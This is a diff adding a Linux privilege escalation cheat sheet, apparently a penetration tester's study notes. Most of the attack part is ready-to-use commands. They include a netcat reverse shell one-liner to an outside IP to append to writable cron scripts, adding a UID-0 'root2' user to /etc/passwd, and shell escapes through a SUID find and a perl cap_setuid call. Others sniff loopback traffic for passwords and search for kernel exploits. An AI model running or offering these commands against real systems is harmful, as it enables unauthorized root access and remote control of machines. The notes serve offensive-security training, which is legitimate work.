@@ -1,0 +1,151 @@
+Linux Privilege Escalation
+
+---------------------------------------------------------------------------------------------------------------------------
+
+Manual Enumeration
+
+id                                       -->  Getting information about the current user
+
+cat /etc/passwd                          -->  Getting information about the users
+
+Note:
+/usr/sbin/nologin                        -->  nologin statement is used to block any remote or local login for service accounts.   
+
+hostname                                 -->  Getting information about the hostname
+
+cat /etc/issue
+cat /etc/os-release
+uname -a                                 -->  Getting the version of the running operating system and architecture
+
+ps aux                                   -->  Getting a list of running processes on Linux
+
+ip a
+ifconfig                                 -->  Listing the full TCP/IP configuration on all available adapters on Linux
+
+routel
+route                                    -->  Printing the routes on Linux
+
+ss -anp
+netstat -tnlp                            -->  Listing all active network connections on Linux
+
+cat /etc/iptables/rules.v4               -->  cat /etc/iptables/rules.v4
+
+ls -lah /etc/cron*                       -->  Listing all cron jobs
+
+sudo crontab -l                          -->  Listing cron jobs for the root user
+
+dpkg -l                                  -->  Listing all installed packages on a Debian Linux operating system
+
+find / -writable -type d 2>/dev/null     -->  Listing all world writable directories
+
+cat /etc/fstab 
+mount                                    -->  Listing content of /etc/fstab and all mounted drives
+
+lsblk                                    -->  Listing all available drives using lsblk
+
+lsmod                                    -->  Listing loaded drivers
+
+/sbin/modinfo libata                     -->  Displaying additional information about a module
+
+env                                      -->  Inspecting Environment Variables for hardcoded credentials
+
+cat .bashrc                              -->  Inspecting .bashrc for hardcoded credentials
+
+su - root
+
+sudo -l                                  -->  Inspecting sudo capabilities
+
+sudo -i                                  -->  Elevating to root
+
+crunch 6 6 -t Lab%%% > wordlist          -->  Generating a wordlist for a bruteforce attack
+
+watch -n 1 "ps -aux | grep pass"         -->  Harvesting Active Processes for Credentials
+
+sudo tcpdump -i lo -A | grep "pass"      -->  Using tcpdump to Perform Password Sniffing
+
+find / -perm -u=s -type f 2>/dev/null    -->  Searching for SUID files
+
+Note:
+When the rights are set to, either an uppercase or lowercase "s" will appear in the permissions. 
+This allows the current user to execute the file with the rights of the owner (setuid) or the owner's group (setgid). 
+
+When running an executable, it normally inherits the permissions of the user that runs it. 
+However, if the SUID permissions are set, the binary will run with the permissions of the file owner. 
+This means that if a binary has the SUID bit set and the file is owned by root, any local user will be able to execute that binary with elevated privileges.
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Automated Enumeration
+
+unix-privesc-check
+
+linpeas           
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Abusing Cron Jobs
+
+grep "CRON" /var/log/syslog                 --> Inspecting the cron log file
+
+
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.199  1234 >/tmp/f"             --> if the file mentioned in cron job is writable then append this line to the file.
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Abusing Writable /etc/passwd file.
+
+openssl passwd w00t                                                                         -->  generating the password hash using the openssl           
+
+echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd                          --> adding root2 user
+
+su root2                                                                                    --> login to root2
+w00t                                                                                        --> password
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Abusing Setuid Binaries and Capabilities
+
+
+find /home/joe/Desktop -exec "/usr/bin/bash" -p \;                                          --> abusing suid bit of find command
+
+Capabilities are extra attributes that can be applied to processes, binaries, and services to assign specific privileges normally reserved for administrative operations, such as traffic capturing or adding kernel modules. 
+Similarly to setuid binaries, if misconfigured, these capabilities could allow an attacker to elevate their privileges to root.
+
+/usr/sbin/getcap -r / 2>/dev/null
+
+/usr/bin/perl = cap_setuid+ep
+/usr/bin/perl5.28.1 = cap_setuid+ep
+
+perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'s
+id
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Abusing Sudo
+
+sudo -l                            -->    Inspecting current user's sudo permissions
+
+search in gtfobins for the command listed through above command
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Exploiting Kernel Vulnerabilities
+
+cat /etc/issue                      -->    Gathering general information on the target system
+
+uname -r 
+arch                                -->    Gathering kernel and architecture information from our Linux target
+
+searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"         -->    Using searchsploit to find privilege escalation exploits for our target
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+
+
+
+
+
+
+
